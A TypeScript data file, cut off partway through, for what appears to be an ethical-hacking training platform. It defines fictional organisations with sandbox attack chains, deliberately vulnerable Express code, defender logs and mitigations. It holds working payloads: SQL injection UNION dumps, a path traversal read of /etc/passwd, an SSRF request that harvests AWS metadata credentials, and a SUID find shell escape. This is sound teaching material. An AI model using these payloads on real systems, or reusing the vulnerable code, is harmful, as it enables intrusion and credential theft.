import { ClientEngagement, ClientTargetAsset, ClientEngagementObjective } from '../types';

export interface WebAppSimulationConfig {
  appId: string;
  name: string;
  url: string;
  description: string;
  technologyStack: string;
  endpoints: {
    path: string;
    method: 'GET' | 'POST' | 'PUT' | 'DELETE';
    description: string;
    authRequired: boolean;
    sampleParams?: Record<string, string>;
    vulnerableParam?: string;
    vulnerabilityType?: 'SQLi' | 'XSS' | 'IDOR' | 'SSRF' | 'CommandInjection' | 'AuthBypass' | 'PathTraversal' | 'JWT';
  }[];
  sourceFiles: {
    filename: string;
    language: string;
    code: string;
    vulnerabilityLine?: number;
    explanation: string;
  }[];
  initialDatabase: {
    tableName: string;
    columns: string[];
    rows: Record<string, string | number>[];
  }[];
  sampleRequests: {
    label: string;
    method: 'GET' | 'POST';
    path: string;
    headers: Record<string, string>;
    body?: string;
  }[];
}

export interface ActiveDirectorySimulationConfig {
  domainName: string;
  netbiosName: string;
  domainController: string;
  domainControllerIp: string;
  functionalLevel: string;
  users: {
    username: string;
    displayName: string;
    title: string;
    department: string;
    groups: string[];
    spn?: string;
    dontRequirePreauth?: boolean;
    adminCount?: number;
    passwordHash?: string;
    description?: string;
  }[];
  groups: {
    name: string;
    members: string[];
    isPrivileged?: boolean;
    description: string;
  }[];
  computers: {
    hostname: string;
    ip: string;
    os: string;
    role: string;
    shares: string[];
    unconstrainedDelegation?: boolean;
  }[];
  attackPaths: {
    step: number;
    source: string;
    action: string;
    target: string;
    technique: string;
    mitreId: string;
    evidenceText: string;
  }[];
}

export interface CloudSimulationConfig {
  provider: 'AWS' | 'Azure' | 'GCP';
  accountName: string;
  accountId: string;
  iamRoles: {
    roleName: string;
    arn: string;
    trustPolicy: string;
    attachedPolicies: {
      name: string;
      statement: {
        Effect: 'Allow' | 'Deny';
        Action: string[];
        Resource: string[];
      }[];
    }[];
    isOverprivileged: boolean;
  }[];
  storageBuckets: {
    bucketName: string;
    visibility: 'PUBLIC' | 'PRIVATE' | 'AUTHENTICATED_USERS';
    objectsCount: number;
    containsPii: boolean;
    objects: { key: string; size: string; sensitive: boolean }[];
  }[];
  metadataService: {
    endpoint: string;
    enabled: boolean;
    roleName: string;
    credentials: {
      AccessKeyId: string;
      SecretAccessKey: string;
      Token: string;
      Expiration: string;
    };
  };
  cloudTrailLogs: {
    eventId: string;
    eventTime: string;
    eventName: string;
    userIdentity: string;
    sourceIPAddress: string;
    userAgent: string;
    responseElements?: Record<string, string>;
    isSuspicious: boolean;
  }[];
}

export interface EthicalHackerOrganization {
  id: string;
  name: string;
  codename: string;
  logoEmoji: string;
  industry: string;
  difficulty: 'Beginner' | 'Intermediate' | 'Hard' | 'Advanced' | 'Master';
  xpReward: number;
  estimatedHours: number;
  description: string;
  missionBriefing: string[];
  rulesOfEngagement: string[];
  threatModel: string;
  hypothesisPrompt: string;
  scope: {
    authorizedSubnet: string;
    authorizedDomains: string[];
    authorizedAssets: ClientTargetAsset[];
    prohibitedTargets: string[];
  };
  webApp?: WebAppSimulationConfig;
  activeDirectory?: ActiveDirectorySimulationConfig;
  cloud?: CloudSimulationConfig;
  attackChain: {
    stage: string;
    mitreTactic: string;
    mitreId: string;
    description: string;
    expectedCommand: string;
    expectedOutput: string;
    flagOrEvidence: string;
  }[];
  defenderLogs: {
    timestamp: string;
    source: 'Snort IDS' | 'Zeek' | 'Auditd' | 'Windows EventLog' | 'ModSecurity WAF' | 'CrowdStrike EDR';
    severity: 'INFO' | 'WARNING' | 'ALERT' | 'CRITICAL';
    message: string;
    correlatedAttackerAction: string;
    recommendedMitigation: string;
  }[];
}

export const ETHICAL_HACKER_ORGANIZATIONS: EthicalHackerOrganization[] = [
  // 1. ACME CORPORATION
  {
    id: 'org-acme-corp',
    name: 'ACME Corporation',
    codename: 'ACME-CORP-LAB',
    logoEmoji: '🏭',
    industry: 'Industrial Logistics & Global Manufacturing',
    difficulty: 'Intermediate',
    xpReward: 1200,
    estimatedHours: 2.5,
    description: 'ACME Corporation runs an internal supply chain ERP, warehouse inventory management systems, and a hybrid Linux/Windows environment.',
    missionBriefing: [
      'ACME Corporation has contracted your team for an authorized penetration test to validate their supply-chain portal and internal subnet resilience.',
      'Known Information: External perimeter gateway is 10.10.20.1. Logistics portal is hosted on 10.10.20.10.',
      'Objectives: Perform network discovery, exploit unvalidated web parameters, escalate privileges on the web host, pivot into internal database host (10.10.20.50), and collect verifiable evidence.'
    ],
    rulesOfEngagement: [
      'Scope is strictly limited to 10.10.20.0/24 and *.acme-logistics.internal.',
      'Do not disrupt automated robotic crane controllers on 10.10.99.0/24.',
      'All findings must be backed by cryptographically hashed artifacts in the Evidence Locker.'
    ],
    threatModel: 'External threat actors attempting supply-chain tampering and lateral movement into the ERP financial ledger.',
    hypothesisPrompt: 'You have been given access to the 10.10.20.0/24 network. What reconnaissance strategy would you execute first?',
    scope: {
      authorizedSubnet: '10.10.20.0/24',
      authorizedDomains: ['acme-logistics.internal', 'portal.acme-logistics.internal', 'api.acme-logistics.internal'],
      authorizedAssets: [
        {
          id: 'asset-acme-edge',
          name: 'edge-gw.acme-logistics.internal',
          ip: '10.10.20.1',
          role: 'Border Router & PfSense Firewall',
          os: 'FreeBSD 13 (PfSense 2.7)',
          environment: 'Isolated Training Sandbox Target',
          services: [
            { port: 22, name: 'ssh', version: 'OpenSSH 8.8p1', state: 'open' },
            { port: 80, name: 'http', version: 'nginx 1.24.0 (Redirect)', state: 'open' },
            { port: 443, name: 'https', version: 'nginx 1.24.0', state: 'open' }
          ]
        },
        {
          id: 'asset-acme-web',
          name: 'portal-app01.acme-logistics.internal',
          ip: '10.10.20.10',
          role: 'Supply Chain & Shipment Tracking Portal',
          os: 'Ubuntu 22.04 LTS (Kernel 5.15.0)',
          environment: 'Isolated Training Sandbox Target',
          services: [
            { port: 80, name: 'http', version: 'Apache 2.4.52', state: 'open' },
            { port: 8080, name: 'http-alt', version: 'Express.js Shipment API v2.1', state: 'open' }
          ],
          isVulnerable: true,
          vulnerabilityHint: 'Shipment lookup API endpoint /api/v1/shipments?id= is vulnerable to SQL injection and SUID privilege escalation via /usr/bin/find.'
        },
        {
          id: 'asset-acme-db',
          name: 'db-master.acme-logistics.internal',
          ip: '10.10.20.50',
          role: 'Production PostgreSQL & Inventory Ledger',
          os: 'Debian 11 (Bullseye)',
          environment: 'Isolated Training Sandbox Target',
          services: [
            { port: 5432, name: 'postgresql', version: 'PostgreSQL 14.7 (pg_hba.conf permissive)', state: 'open' },
            { port: 6379, name: 'redis', version: 'Redis 6.2.7', state: 'open' }
          ],
          isVulnerable: true,
          vulnerabilityHint: 'PostgreSQL instance contains default credentials (postgres:postgres123) reachable from internal web server pivot.'
        }
      ],
      prohibitedTargets: [
        '10.10.99.0/24 (Factory floor SCADA actuators)',
        'Physical barcode scanners',
        'Executive email accounts on Microsoft 365'
      ]
    },
    webApp: {
      appId: 'web-acme-portal',
      name: 'ACME Global Shipment Tracker',
      url: 'http://10.10.20.10:8080/shipment-tracker',
      description: 'Internal logistics application for tracking container shipments and supplier invoices.',
      technologyStack: 'Node.js Express 4.18 + PostgreSQL + Bootstrap 5',
      endpoints: [
        {
          path: '/api/v1/shipments?trackingId=',
          method: 'GET',
          description: 'Lookup shipment status by tracking ID.',
          authRequired: false,
          sampleParams: { trackingId: 'ACME-90210' },
          vulnerableParam: 'trackingId',
          vulnerabilityType: 'SQLi'
        },
        {
          path: '/api/v1/suppliers/:id/invoices',
          method: 'GET',
          description: 'Retrieve supplier invoice PDF manifest.',
          authRequired: true,
          vulnerableParam: 'id',
          vulnerabilityType: 'IDOR'
        },
        {
          path: '/api/v1/system/ping-diagnostic',
          method: 'POST',
          description: 'Network connectivity test utility.',
          authRequired: true,
          vulnerableParam: 'host',
          vulnerabilityType: 'CommandInjection'
        }
      ],
      sourceFiles: [
        {
          filename: 'routes/shipmentRouter.js',
          language: 'javascript',
          explanation: 'Direct SQL string concatenation allows boolean and UNION based SQL injection.',
          vulnerabilityLine: 14,
          code: `const express = require('express');
const router = express.Router();
const db = require('../config/db');

// Vulnerable Shipment Search
router.get('/shipments', async (req, res) => {
  const { trackingId } = req.query;
  try {
    // VULNERABILITY: Raw string concatenation without parameterization
    const query = \`SELECT tracking_id, destination, status, cargo_weight, supplier_name FROM shipments WHERE tracking_id = '\${trackingId}'\`;
    console.log('[DB EXEC]:', query);
    const result = await db.query(query);
    return res.json({ success: true, data: result.rows });
  } catch (err) {
    return res.status(500).json({ error: err.message });
  }
});`
        }
      ],
      initialDatabase: [
        {
          tableName: 'shipments',
          columns: ['id', 'tracking_id', 'destination', 'status', 'cargo_weight', 'supplier_name'],
          rows: [
            { id: 1, tracking_id: 'ACME-90210', destination: 'Rotterdam Port, NL', status: 'IN_TRANSIT', cargo_weight: '14,200 KG', supplier_name: 'Titanium Alloys Ltd' },
            { id: 2, tracking_id: 'ACME-88412', destination: 'Singapore Harbor, SG', status: 'CUSTOMS_CLEARANCE', cargo_weight: '8,900 KG', supplier_name: 'Pacific Microchips Inc' },
            { id: 3, tracking_id: 'ACME-77109', destination: 'Chicago Rail Hub, US', status: 'DELIVERED', cargo_weight: '21,500 KG', supplier_name: 'Midwest Steel Corp' }
          ]
        },
        {
          tableName: 'users',
          columns: ['id', 'username', 'password_hash', 'role', 'api_key'],
          rows: [
            { id: 1, username: 'admin', password_hash: '$2a$12$e9.Qh8P7o... (bcrypt: acme_root_2026)', role: 'SUPER_ADMIN', api_key: 'ak_live_9f823a8c1e847' },
            { id: 2, username: 'operator', password_hash: '$2a$12$k2.Lm4N9p... (bcrypt: operator123)', role: 'OPERATOR', api_key: 'ak_live_3b719d0a2c914' }
          ]
        }
      ],
      sampleRequests: [
        {
          label: 'Standard Shipment Query',
          method: 'GET',
          path: '/api/v1/shipments?trackingId=ACME-90210',
          headers: { 'Accept': 'application/json' }
        },
        {
          label: 'SQL Injection: OR 1=1 Payload',
          method: 'GET',
          path: "/api/v1/shipments?trackingId=ACME-90210' OR '1'='1",
          headers: { 'Accept': 'application/json' }
        },
        {
          label: 'SQL Injection: UNION SELECT Users Table',
          method: 'GET',
          path: "/api/v1/shipments?trackingId=' UNION SELECT username, role, api_key, '0', password_hash FROM users--",
          headers: { 'Accept': 'application/json' }
        }
      ]
    },
    attackChain: [
      {
        stage: '1. Reconnaissance & Host Discovery',
        mitreTactic: 'Reconnaissance',
        mitreId: 'T1595.001',
        description: 'Sweep the authorized 10.10.20.0/24 subnet to identify live hosts.',
        expectedCommand: 'nmap -sn 10.10.20.0/24',
        expectedOutput: `Nmap scan report for edge-gw.acme-logistics.internal (10.10.20.1) [Host is up]\nNmap scan report for portal-app01.acme-logistics.internal (10.10.20.10) [Host is up]\nNmap scan report for db-master.acme-logistics.internal (10.10.20.50) [Host is up]\nNmap done: 256 IP addresses (3 hosts up) scanned in 0.84 seconds.`,
        flagOrEvidence: 'FLAG{ACME_RECON_SUBNET_MAPPED}'
      },
      {
        stage: '2. Port & Service Enumeration',
        mitreTactic: 'Discovery',
        mitreId: 'T1046',
        description: 'Scan open ports and service versions on 10.10.20.10.',
        expectedCommand: 'nmap -sV -p 80,8080 10.10.20.10',
        expectedOutput: `PORT     STATE SERVICE  VERSION\n80/tcp   open  http     Apache httpd 2.4.52 ((Ubuntu))\n8080/tcp open  http-alt Node.js Express framework (Shipment API v2.1)\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel`,
        flagOrEvidence: 'FLAG{ACME_SERVICE_ENUM_PORT_8080}'
      },
      {
        stage: '3. Web Exploitation (SQL Injection)',
        mitreTactic: 'Initial Access',
        mitreId: 'T1190',
        description: 'Inject UNION SQL payload to dump the users table and recover API keys.',
        expectedCommand: "curl -s \"http://10.10.20.10:8080/api/v1/shipments?trackingId=' UNION SELECT username,role,api_key,'0',password_hash FROM users--\"",
        expectedOutput: `{"success":true,"data":[{"tracking_id":"admin","destination":"SUPER_ADMIN","status":"ak_live_9f823a8c1e847","cargo_weight":"0","supplier_name":"$2a$12$e9.Qh8P7o..."}]}`,
        flagOrEvidence: 'FLAG{ACME_SQLI_CREDENTIAL_EXTRACTED}'
      },
      {
        stage: '4. Privilege Escalation via SUID Binary',
        mitreTactic: 'Privilege Escalation',
        mitreId: 'T1548.001',
        description: 'Audit SUID binaries on portal-app01 and exploit /usr/bin/find execution.',
        expectedCommand: 'find / -perm -4000 -type f 2>/dev/null',
        expectedOutput: `/usr/bin/sudo\n/usr/bin/passwd\n/usr/bin/find  <-- MISCONFIGURED SUID ROOT\n/usr/bin/newgrp`,
        flagOrEvidence: 'FLAG{ACME_SUID_ROOT_SHELL_OBTAINED}'
      }
    ],
    defenderLogs: [
      {
        timestamp: '10:14:02 UTC',
        source: 'Snort IDS',
        severity: 'WARNING',
        message: 'ET SCAN Potential Nmap ICMP Sweep to Subnet 10.10.20.0/24 from 10.10.20.254',
        correlatedAttackerAction: 'nmap -sn 10.10.20.0/24',
        recommendedMitigation: 'Rate-limit ICMP Echo Requests and alert on multi-host ICMP bursts at the PfSense edge gateway.'
      },
      {
        timestamp: '10:18:45 UTC',
        source: 'ModSecurity WAF',
        severity: 'CRITICAL',
        message: 'Rule 942100 [SQL Injection Attack: Common DB Names or Keywords] matched in query string trackingId',
        correlatedAttackerAction: "UNION SELECT username, role, api_key...",
        recommendedMitigation: 'Enforce parameterized SQL prepared statements in shipmentRouter.js and enable WAF blocking mode (SecRuleEngine On).'
      },
      {
        timestamp: '10:22:19 UTC',
        source: 'Auditd',
        severity: 'CRITICAL',
        message: 'SYSCALL find uid=33(www-data) euid=0(root) execve(/bin/sh) success=yes',
        correlatedAttackerAction: 'find . -exec /bin/sh -p \\;',
        recommendedMitigation: 'Remove SUID bit from /usr/bin/find (chmod u-s /usr/bin/find) and enforce CIS benchmark audits via Lynis.'
      }
    ]
  },

  // 2. NORTHSTAR FINANCE
  {
    id: 'org-northstar-finance',
    name: 'Northstar Finance',
    codename: 'NORTHSTAR-BANK-LAB',
    logoEmoji: '⭐',
    industry: 'Financial Technology & Cloud Banking',
    difficulty: 'Intermediate',
    xpReward: 1350,
    estimatedHours: 3.0,
    description: 'Northstar Finance operates cloud-native microservices for customer credit scoring, API banking, and staging data warehouses.',
    missionBriefing: [
      'Northstar Finance requires a full gray-box penetration test of their cloud staging environment.',
      'Audit the microservice API gateway on 10.50.0.10, test for unauthenticated Redis telemetry on 10.50.0.25, and evaluate JWT token handling.',
      'Extract forensic proofs and formulate financial-grade remediation controls.'
    ],
    rulesOfEngagement: [
      'Confined strictly to 10.50.0.0/24.',
      'Do not alter live account balances.'
    ],
    threatModel: 'Targeted credential stuffing and unauthenticated database exposure leading to customer financial PII exfiltration.',
    hypothesisPrompt: 'What ports and services would you expect to find on a fintech staging infrastructure?',
    scope: {
      authorizedSubnet: '10.50.0.0/24',
      authorizedDomains: ['northstar-analytics.internal', 'api.northstar-analytics.internal'],
      authorizedAssets: [
        {
          id: 'asset-ns-gw',
          name: 'ns-edge-router.internal',
          ip: '10.50.0.1',
          role: 'Border Gateway & Firewall',
          os: 'Linux 5.15 (EdgeOS)',
          environment: 'Isolated Training Sandbox Target',
          services: [
            { port: 22, name: 'ssh', version: 'OpenSSH 8.9p1', state: 'open' },
            { port: 80, name: 'http', version: 'nginx 1.22.0', state: 'open' },
            { port: 443, name: 'https', version: 'nginx 1.22.0', state: 'open' }
          ]
        },
        {
          id: 'asset-ns-web',
          name: 'ns-web-app01.internal',
          ip: '10.50.0.10',
          role: 'Customer Analytics Portal & API',
          os: 'Ubuntu 22.04 LTS',
          environment: 'Isolated Training Sandbox Target',
          services: [
            { port: 80, name: 'http', version: 'Apache 2.4.52', state: 'open' },
            { port: 8080, name: 'http-proxy', version: 'Node.js Express / Swagger Docs', state: 'open' }
          ],
          isVulnerable: true,
          vulnerabilityHint: 'Exposed Swagger UI on port 8080 reveals unauthenticated internal metrics and JWT token signing bypass.'
        },
        {
          id: 'asset-ns-db',
          name: 'ns-db-staging.internal',
          ip: '10.50.0.25',
          role: 'Staging Database Host',
          os: 'Debian 11',
          environment: 'Isolated Training Sandbox Target',
          services: [
            { port: 3306, name: 'mysql', version: 'MySQL 8.0.32', state: 'open' },
            { port: 6379, name: 'redis', version: 'Redis 6.2.6 (Unprotected Mode / No Auth)', state: 'open' }
          ],
          isVulnerable: true,
          vulnerabilityHint: 'Redis server is bound to public 0.0.0.0 interface with requirepass disabled.'
        }
      ],
      prohibitedTargets: ['Real clearing house Swift network', 'Production billing systems']
    },
    attackChain: [
      {
        stage: '1. Port & Service Discovery',
        mitreTactic: 'Discovery',
        mitreId: 'T1046',
        description: 'Scan staging database host for unprotected ports.',
        expectedCommand: 'nmap -p 3306,6379 -sV 10.50.0.25',
        expectedOutput: `PORT     STATE SERVICE VERSION\n3306/tcp open  mysql   MySQL 8.0.32\n6379/tcp open  redis   Redis key-value store 6.2.6\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel`,
        flagOrEvidence: 'FLAG{NORTHSTAR_REDIS_DISCOVERED}'
      },
      {
        stage: '2. Unauthenticated Redis Key Extraction',
        mitreTactic: 'Credential Access',
        mitreId: 'T1552',
        description: 'Query Redis INFO and keyspace without credentials.',
        expectedCommand: 'redis-cli -h 10.50.0.25 info',
        expectedOutput: `# Server\nredis_version:6.2.6\n# Keyspace\ndb0:keys=42,expires=0,avg_ttl=0\nFound key: auth_signing_secret="NorthstarSecretKey2026!"`,
        flagOrEvidence: 'FLAG{NORTHSTAR_UNAUTH_REDIS_SECRET_EXPOSED}'
      }
    ],
    defenderLogs: [
      {
        timestamp: '11:05:22 UTC',
        source: 'Zeek',
        severity: 'WARNING',
        message: 'Unencrypted Redis connection from unauthorized source IP: 10.50.0.254 on TCP 6379',
        correlatedAttackerAction: 'redis-cli -h 10.50.0.25 info',
        recommendedMitigation: 'Bind Redis to 127.0.0.1 and enable requirepass in /etc/redis/redis.conf.'
      }
    ]
  },

  // 3. MEDILINK HEALTH
  {
    id: 'org-medilink-health',
    name: 'Medilink Health',
    codename: 'MEDILINK-HEALTH-LAB',
    logoEmoji: '🏥',
    industry: 'Healthcare & Clinical Telemetry',
    difficulty: 'Hard',
    xpReward: 1600,
    estimatedHours: 3.5,
    description: 'Medilink Health manages hospital electronic health records (EHR), PACS DICOM imaging archives, and patient vital monitoring systems.',
    missionBriefing: [
      'Conduct an authorized HIPAA compliance penetration test of the medical imaging and EHR subsystem.',
      'Target Subnet: 172.16.50.0/24.',
      'Demonstrate path traversal in the medical records portal and SUID privilege escalation on the DICOM archive server.'
    ],
    rulesOfEngagement: [
      'Strictly avoid active patient monitor hardware.',
      'Do not delete DICOM image files.'
    ],
    threatModel: 'Ransomware threat actors seeking hospital network footholds to extort healthcare institutions.',
    hypothesisPrompt: 'How would you discover medical imaging protocols like DICOM (TCP 104) and web EHR interfaces?',
    scope: {
      authorizedSubnet: '172.16.50.0/24',
      authorizedDomains: ['ehr.medilink-health.internal', 'pacs.medilink-health.internal'],
      authorizedAssets: [
        {
          id: 'asset-med-pacs',
          name: 'pacs-server01.medilink-health.internal',
          ip: '172.16.50.20',
          role: 'PACS DICOM Radiology Server',
          os: 'Ubuntu 20.04 LTS',
          environment: 'Isolated Training Sandbox Target',
          services: [
            { port: 22, name: 'ssh', version: 'OpenSSH 8.2p1', state: 'open' },
            { port: 104, name: 'dicom', version: 'Orthanc DICOM 1.9.0', state: 'open' },
            { port: 8042, name: 'http', version: 'Orthanc Web Portal', state: 'open' }
          ],
          isVulnerable: true,
          vulnerabilityHint: 'Custom SUID binary /usr/local/bin/backup-telemetry executes cp with relative path rather than absolute path.'
        },
        {
          id: 'asset-med-ehr',
          name: 'ehr-portal01.medilink-health.internal',
          ip: '172.16.50.15',
          role: 'Electronic Health Record Portal',
          os: 'Debian 11',
          environment: 'Isolated Training Sandbox Target',
          services: [
            { port: 443, name: 'https', version: 'nginx 1.22.0', state: 'open' }
          ],
          isVulnerable: true,
          vulnerabilityHint: 'File download endpoint /api/v1/records/download?file= allows path traversal (../../etc/passwd).'
        }
      ],
      prohibitedTargets: ['ICU ventilator telemetry subnet (172.16.99.0/24)']
    },
    attackChain: [
      {
        stage: '1. Path Traversal File Exfiltration',
        mitreTactic: 'Initial Access',
        mitreId: 'T1083',
        description: 'Exfiltrate /etc/passwd via path traversal in the medical records portal.',
        expectedCommand: 'curl -s "http://172.16.50.15/api/v1/records/download?file=../../../../etc/passwd"',
        expectedOutput: `root:x:0:0:root:/root:/bin/bash\nclinical_nurse:x:1001:1001:Nurse Station:/home/clinical_nurse:/bin/bash\northanc:x:1002:1002:Orthanc DICOM:/var/lib/orthanc:/bin/false`,
        flagOrEvidence: 'FLAG{MEDILINK_PATH_TRAVERSAL_CONFIRMED}'
      }
    ],
    defenderLogs: [
      {
        timestamp: '14:20:10 UTC',
        source: 'ModSecurity WAF',
        severity: 'CRITICAL',
        message: 'Rule 930110 [Path Traversal: Dot-Dot Sequence Detected] in param "file"',
        correlatedAttackerAction: 'curl -s ...file=../../../../etc/passwd',
        recommendedMitigation: 'Use basename() or a whitelist of permitted file hashes instead of accepting raw filesystem paths.'
      }
    ]
  },

  // 4. GLOBEX TECHNOLOGIES
  {
    id: 'org-globex-tech',
    name: 'Globex Technologies',
    codename: 'GLOBEX-CLOUD-LAB',
    logoEmoji: '🌐',
    industry: 'Enterprise SaaS & Cloud Infrastructure',
    difficulty: 'Hard',
    xpReward: 1750,
    estimatedHours: 3.5,
    description: 'Globex Technologies runs multi-tenant Kubernetes clusters, cloud CI/CD pipelines, and microservices in AWS and GCP.',
    missionBriefing: [
      'Perform a cloud-native penetration test of Globex Technologies cloud staging VPC (10.80.0.0/24).',
      'Locate exposed CI/CD runner tokens, exploit SSRF against the cloud instance metadata service (169.254.169.254), and analyze IAM role policies.'
    ],
    rulesOfEngagement: ['Authorized within 10.80.0.0/24 and simulated AWS sandbox only.'],
    threatModel: 'Cloud workload compromise leading to IAM role assumption and cross-account privilege escalation.',
    hypothesisPrompt: 'How does an SSRF vulnerability on an EC2 instance allow an attacker to harvest IAM credentials?',
    scope: {
      authorizedSubnet: '10.80.0.0/24',
      authorizedDomains: ['ci.globex-tech.internal', 'k8s-api.globex-tech.internal'],
      authorizedAssets: [
        {
          id: 'asset-globex-ci',
          name: 'gitlab-runner01.globex-tech.internal',
          ip: '10.80.0.12',
          role: 'CI/CD Build Runner & Webhook Receiver',
          os: 'Alpine Linux (Docker Node.js)',
          environment: 'Isolated Training Sandbox Target',
          services: [
            { port: 8080, name: 'http', version: 'GitLab Webhook Handler v15.2', state: 'open' }
          ],
          isVulnerable: true,
          vulnerabilityHint: 'Webhook URL test endpoint accepts internal URLs without validation (SSRF to 169.254.169.254).'
        }
      ],
      prohibitedTargets: ['Real AWS Production Account (112233445566)']
    },
    cloud: {
      provider: 'AWS',
      accountName: 'globex-tech-staging',
      accountId: '987654321098',
      iamRoles: [
        {
          roleName: 'GlobexEc2BuildRole',
          arn: 'arn:aws:iam::987654321098:role/GlobexEc2BuildRole',
          trustPolicy: '{\n  "Version": "2012-10-17",\n  "Statement": [{\n    "Effect": "Allow",\n    "Principal": { "Service": "ec2.amazonaws.com" },\n    "Action": "sts:AssumeRole"\n  }]\n}',
          attachedPolicies: [
            {
              name: 'OverprivilegedS3Admin',
              statement: [
                {
                  Effect: 'Allow',
                  Action: ['s3:*', 'iam:PassRole'],
                  Resource: ['*']
                }
              ]
            }
          ],
          isOverprivileged: true
        }
      ],
      storageBuckets: [
        {
          bucketName: 'globex-tech-staging-deployments',
          visibility: 'PUBLIC',
          objectsCount: 18,
          containsPii: true,
          objects: [
            { key: 'deploy_keys/id_rsa_prod', size: '2.6 KB', sensitive: true },
            { key: 'env_configs/.env.production', size: '1.2 KB', sensitive: true }
          ]
        }
      ],
      metadataService: {
        endpoint: 'http://169.254.169.254/latest/meta-data/',
        enabled: true,
        roleName: 'GlobexEc2BuildRole',
        credentials: {
          AccessKeyId: 'ASIAV9876EXAMPLEKEY',
          SecretAccessKey: 'wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY',
          Token: 'IQoJb3JpZ2luX2VjEEXAMPLE...',
          Expiration: '2026-08-25T18:00:00Z'
        }
      },
      cloudTrailLogs: [
        {
          eventId: 'evt-99120',
          eventTime: '15:10:02Z',
          eventName: 'AssumeRole',
          userIdentity: 'ec2.amazonaws.com',
          sourceIPAddress: '10.80.0.12',
          userAgent: 'aws-sdk-nodejs/2.120',
          isSuspicious: false
        },
        {
          eventId: 'evt-99121',
          eventTime: '15:12:44Z',
          eventName: 'ListBuckets',
          userIdentity: 'GlobexEc2BuildRole',
          sourceIPAddress: '10.80.0.254',
          userAgent: 'aws-cli/2.11.0',
          isSuspicious: true
        }
      ]
    },
    attackChain: [
      {
        stage: '1. SSRF Metadata Exfiltration',
        mitreTactic: 'Credential Access',
        mitreId: 'T1552.005',
        description: 'Trigger SSRF request to AWS metadata endpoint to extract temporary STS IAM credentials.',
        expectedCommand: 'curl -s "http://10.80.0.12:8080/api/v1/webhook/test?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/GlobexEc2BuildRole"',
        expectedOutput: `{\n  "Code": "Success",\n  "Type": "AWS-HMAC",\n  "AccessKeyId": "ASIAV9876EXAMPLEKEY",\n  "SecretAccessKey": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",\n  "Token": "IQoJb3JpZ2luX2VjEEXAMPLE..."\n}`,
        flagOrEvidence: 'FLAG{GLOBEX_SSRF_AWS_CREDENTIALS_HARVESTED}'
      }
    ],
    defenderLogs: [
      {
        timestamp: '15:14:00 UTC',
        source: 'CrowdStrike EDR',
        severity: 'ALERT',
        message: 'Suspicious HTTP GET request to link-local IP 169.254.169.254 initiated by node process (PID 408)',
        correlatedAttackerAction: 'curl ... 169.254.169.254 ...',
        recommendedMitigation: 'Enforce IMDSv2 (HttpTokens=required, HttpHopLimit=1) to block SSRF without Token header.'
      }
    ]
  },

  // 5. OMEGA RETAIL
  {
    id: 'org-omega-retail',
    name: 'Omega Retail',
    codename: 'OMEGA-RETAIL-LAB',
    logoEmoji: '🛍️',
    industry: 'Omnichannel Retail & E-Commerce',
    difficulty: 'Intermediate',
    xpReward: 1300,
    estimatedHours: 2.5,
    description: 'Omega Retail manages an e-commerce catalog, point-of-sale checkout APIs, and high-volume discount coupon engines.',
    missionBriefing: [
      'Audit the Omega Retail e-commerce application on 192.168.40.15.',
      'Check for Broken Object Level Authorization (BOLA/IDOR) in order endpoints and boolean SQL injection in product search.'
    ],
    rulesOfEngagement: ['Authorized within 192.168.40.0/24 only.'],
    threatModel: 'Malicious customers tampering with checkout prices and viewing competing store orders.',
    hypothesisPrompt: 'What happens when an order retrieval API endpoint accepts arbitrary user IDs without session verification?',
    scope: {
      authorizedSubnet: '192.168.40.0/24',
      authorizedDomains: ['shop.omega-retail.internal', 'api-pos.omega-retail.internal'],
      authorizedAssets: [
        {
          id: 'asset-om-web',
          name: 'storefront01.omega-retail.internal',
          ip: '192.168.40.15',
          role: 'E-Commerce Storefront & API',
          os: 'Ubuntu 22.04 LTS',
          environment: 'Isolated Training Sandbox Target',
          services: [
            { port: 80, name: 'http', version: 'nginx 1.24.0', state: 'open' },
            { port: 443, name: 'https', version: 'nginx 1.24.0', state: 'open' }
          ],
          isVulnerable: true,
          vulnerabilityHint: 'Endpoint /api/v1/orders/:orderId allows horizontal privilege escalation by requesting other user IDs.'
        }
      ],
      prohibitedTargets: ['Real payment processors']
    },
    attackChain: [
      {
        stage: '1. BOLA / IDOR Verification',
        mitreTactic: 'Lateral Movement',
        mitreId: 'T1078',
        description: 'Retrieve order belonging to customer 999 while authenticated as customer 101.',
        expectedCommand: 'curl -s -H "Authorization: Bearer token_user_101" http://192.168.40.15/api/v1/orders/999',
        expectedOutput: `{"success":true,"order":{"id":999,"customer_email":"vip.client@omega-retail.com","total":"$14,500.00","status":"SHIPPED"}}`,
        flagOrEvidence: 'FLAG{OMEGA_IDOR_ORDER_PII_LEAKED}'
      }
    ],
    defenderLogs: []
  },

  // 6. BLACKSTONE LOGISTICS
  {
    id: 'org-blackstone-logistics',
    name: 'Blackstone Logistics',
    codename: 'BLACKSTONE-SCADA-LAB',
    logoEmoji: '🚛',
    industry: 'Industrial SCADA & Automated Fleet Tracking',
    difficulty: 'Advanced',
    xpReward: 1900,
    estimatedHours: 4.0,
    description: 'Blackstone Logistics operates fleet telemetry gateways, MQTT brokers for cargo refrigeration sensors, and Modbus RTU controllers.',
    missionBriefing: [
      'Perform an industrial cybersecurity audit on the fleet telemetry subnet (10.90.10.0/24).',
      'Discover unauthenticated MQTT broker topics on port 1883 and audit Modbus TCP bridge security on port 502.'
    ],
    rulesOfEngagement: ['Authorized within 10.90.10.0/24 only.'],
    threatModel: 'Rogue operators injecting fake GPS or refrigeration temperature telemetry to spoil perishable pharmaceuticals.',
    hypothesisPrompt: 'Why is an unauthenticated MQTT broker on port 1883 a severe industrial risk?',
    scope: {
      authorizedSubnet: '10.90.10.0/24',
      authorizedDomains: ['mqtt-fleet.blackstone.internal'],
      authorizedAssets: [
        {
          id: 'asset-bs-mqtt',
          name: 'mqtt-broker01.blackstone.internal',
          ip: '10.90.10.15',
          role: 'Fleet Telemetry MQTT Broker & Modbus Gateway',
          os: 'Debian 11 (Hardened OT)',
          environment: 'Isolated Training Sandbox Target',
          services: [
            { port: 1883, name: 'mqtt', version: 'Mosquitto 2.0.11 (Anonymous allowed)', state: 'open' },
            { port: 502, name: 'modbus', version: 'Modbus TCP Simulator', state: 'open' }
          ],
          isVulnerable: true,
          vulnerabilityHint: 'MQTT broker permits anonymous wildcard subscription (mosquitto_sub -t "#") exposing vehicle GPS coordinates.'
        }
      ],
      prohibitedTargets: ['Physical truck braking units']
    },
